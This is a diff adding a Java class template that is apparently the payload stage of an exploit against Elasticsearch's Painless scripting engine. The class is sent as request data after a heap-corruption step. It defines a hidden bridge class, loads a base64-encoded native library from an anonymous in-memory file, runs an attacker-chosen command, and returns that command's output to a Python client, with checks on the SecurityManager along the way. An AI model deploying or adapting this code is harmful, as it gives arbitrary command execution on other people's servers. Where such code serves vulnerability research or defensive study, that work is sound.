@@ -1,0 +1,163 @@
+package org.elasticsearch.painless;
+import java.io.ByteArrayInputStream;
+import java.io.DataInputStream;
+import java.lang.invoke.MethodHandles;
+import java.lang.reflect.InvocationTargetException;
+import java.nio.ByteBuffer;
+import java.nio.channels.SeekableByteChannel;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.StandardOpenOption;
+import java.security.MessageDigest;
+import java.util.Base64;
+import java.util.HexFormat;
+
+public final class @@CLASS@@ {
+    // This class is supplied as request data. The payload defines it only after
+    // the original decoder-corruption witness permits the heap operations.
+    private static final String TOKEN = "@@TOKEN@@";
+    private static byte[] decode(String... chunks) {
+        return Base64.getDecoder().decode(String.join("", chunks));
+    }
+    private static String quote(String value) {
+        StringBuilder out = new StringBuilder("\"");
+        for (int i = 0; i < value.length(); ++i) {
+            char c = value.charAt(i);
+            if (c == '"' || c == '\\') out.append('\\').append(c);
+            else if (c < 32) out.append(String.format("\\u%04x", (int)c));
+            else out.append(c);
+        }
+        return out.append('"').toString();
+    }
+    private static String envelope(String fields) {
+        // The outer token can be checked by Painless without parsing JSON; the
+        // inner token and protocol are checked again by the Python client.
+        String json = "{\"protocol\":2,\"token\":" + quote(TOKEN) + "," + fields + "}";
+        return TOKEN + ":" + Base64.getEncoder().encodeToString(json.getBytes(StandardCharsets.UTF_8));
+    }
+    private static String[] argv() throws Exception {
+        // Match the Python encoder's length-prefixed UTF-8 argument vector.
+        // No shell parses the command or changes argument boundaries.
+        DataInputStream in = new DataInputStream(new ByteArrayInputStream(
+            decode(@@ARGV@@)));
+        int count = in.readInt();
+        if (count < 1 || count > 64) throw new IllegalArgumentException("argv count");
+        String[] result = new String[count];
+        for (int i = 0; i < count; ++i) {
+            int length = in.readInt();
+            if (length < 0 || length > 32768) throw new IllegalArgumentException("argv length");
+            byte[] value = in.readNBytes(length);
+            if (value.length != length) throw new IllegalArgumentException("short argv");
+            result[i] = new String(value, StandardCharsets.UTF_8);
+        }
+        if (in.available() != 0) throw new IllegalArgumentException("trailing argv");
+        return result;
+    }
+    private static void checkLibraryBytes(SeekableByteChannel channel, byte[] expected) throws Exception {
+        // Read back the held anonymous inode, never a replaceable pathname.
+        if (!channel.isOpen() || channel.size() != expected.length)
+            throw new IllegalStateException("anonymous native library size differs");
+        ByteBuffer buffer = ByteBuffer.allocate(expected.length + 1);
+        channel.position(0);
+        while (buffer.hasRemaining()) {
+            int count = channel.read(buffer);
+            if (count < 0) break;
+            if (count == 0) throw new IllegalStateException("native library read made no progress");
+        }
+        byte[] actual = java.util.Arrays.copyOf(buffer.array(), buffer.position());
+        if (actual.length != expected.length || !MessageDigest.isEqual(
+                MessageDigest.getInstance("SHA-256").digest(actual),
+                HexFormat.of().parseHex("@@LIBRARY_SHA@@")))
+            throw new IllegalStateException("anonymous native library hash differs");
+    }
+    @SuppressWarnings("removal")
+    public static String run(String path, String text) throws Exception {
+        Path marker = Path.of(path);
+        if (!marker.isAbsolute()) throw new IllegalArgumentException("proof path must be absolute");
+        // The original payload calls the .denied path before clearing and
+        // after restoring the SecurityManager. Exercise its real FilePermission
+        // check without creating a name that would need racy remote cleanup.
+        SecurityManager manager = System.getSecurityManager();
+        if (manager != null) {
+            manager.checkWrite(path);
+            throw new IllegalStateException("SecurityManager write check unexpectedly allowed the proof path");
+        }
+        if (path.endsWith(".denied"))
+            throw new IllegalStateException("SecurityManager is missing for the permission probe");
+        boolean markerCreated = false;
+        if (@@CREATE_MARKER@@) {
+            // Only the controlled local comparison creates a named proof file.
+            // CREATE_NEW makes a pre-existing file unable to satisfy that proof.
+            Files.write(marker, text.getBytes(StandardCharsets.UTF_8),
+                        StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE);
+            markerCreated = true;
+        }
+        String fields;
+        SeekableByteChannel channel = null;
+        boolean libraryAnonymous = false;
+        boolean libraryDescriptorClosed = true;
+        try {
+            byte[] nativeBytes = decode(@@LIBRARY@@);
+            String actualHash = HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(nativeBytes));
+            if (!actualHash.equals("@@LIBRARY_SHA@@")) throw new IllegalStateException("native library hash");
+            // A retained JVM may already contain the bridge. Reuse it only when
+            // its embedded build identity matches these supplied artifacts.
+            Class<?> bridge;
+            try {
+                bridge = Class.forName("org.elasticsearch.painless.OwnedNativeCommand", false,
+                                       @@CLASS@@.class.getClassLoader());
+            } catch (ClassNotFoundException missing) {
+                bridge = MethodHandles.lookup().defineClass(decode(@@BRIDGE@@));
+            }
+            if (!"@@BUILD_ID@@".equals(bridge.getMethod("buildId").invoke(null)))
+                throw new IllegalStateException("A different native command bridge is already defined");
+            // Ownership transfers only when openAnonymous returns a channel.
+            // The same open inode is written, verified and loaded; there is no
+            // temporary library pathname to reopen or unlink afterwards.
+            libraryDescriptorClosed = false;
+            channel = (SeekableByteChannel)bridge.getMethod("openAnonymous", String.class)
+                .invoke(null, marker.getParent().toString());
+            if (channel == null) throw new IllegalStateException("anonymous library channel is unavailable");
+            libraryAnonymous = true;
+            ByteBuffer buffer = ByteBuffer.wrap(nativeBytes);
+            while (buffer.hasRemaining())
+                if (channel.write(buffer) <= 0)
+                    throw new IllegalStateException("native library write made no progress");
+            checkLibraryBytes(channel, nativeBytes);
+            // The bridge returns metadata plus the two exact byte streams. Its
+            // timeout governs native command execution, not all Java preparation.
+            byte[][] result = (byte[][])bridge.getMethod("run", SeekableByteChannel.class, String[].class, int.class)
+                .invoke(null, channel, argv(), @@TIMEOUT@@);
+            if (result.length != 3) throw new IllegalStateException("native result shape");
+            fields = "\"state\":\"completed\",\"metadata\":" + new String(result[0], StandardCharsets.UTF_8)
+                + ",\"stdout_base64\":" + quote(Base64.getEncoder().encodeToString(result[1]))
+                + ",\"stderr_base64\":" + quote(Base64.getEncoder().encodeToString(result[2]));
+        } catch (Throwable error) {
+            if (error instanceof InvocationTargetException && error.getCause() != null) error = error.getCause();
+            fields = "\"state\":\"error\",\"error\":" + quote(error.toString());
+        }
+        // Close even after preparation or execution fails. If creation threw
+        // before returning ownership, report closure as unknown instead of
+        // claiming that an unobserved descriptor was cleaned up.
+        String libraryCleanupError = null;
+        if (channel != null) {
+            try {
+                channel.close();
+                if (channel.isOpen()) throw new IllegalStateException("anonymous library channel remains open");
+                libraryDescriptorClosed = true;
+            } catch (Throwable error) {
+                libraryDescriptorClosed = false;
+                libraryCleanupError = error.toString();
+            }
+        } else if (!libraryDescriptorClosed) {
+            libraryCleanupError = "Anonymous library creation did not establish descriptor closure";
+        }
+        fields += ",\"library_anonymous\":" + libraryAnonymous
+            + ",\"library_descriptor_closed\":" + libraryDescriptorClosed
+            + ",\"marker_file_created\":" + markerCreated;
+        if (libraryCleanupError != null)
+            fields += ",\"library_cleanup_error\":" + quote(libraryCleanupError);
+        return envelope(fields);
+    }
+}
